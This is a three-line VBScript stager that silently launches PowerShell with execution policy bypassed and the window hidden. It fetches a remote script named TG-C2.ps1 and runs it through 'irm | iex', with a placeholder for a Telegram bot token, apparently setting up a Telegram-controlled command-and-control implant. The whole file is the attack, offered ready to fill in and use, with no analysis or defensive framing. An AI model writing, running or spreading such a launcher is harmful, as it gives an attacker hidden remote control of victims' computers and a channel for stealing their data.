Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C $tg='YOUR_TELEGRAM_BOT_API_TOKEN_HERE'; irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/TG-C2.ps1 | iex", 0, True

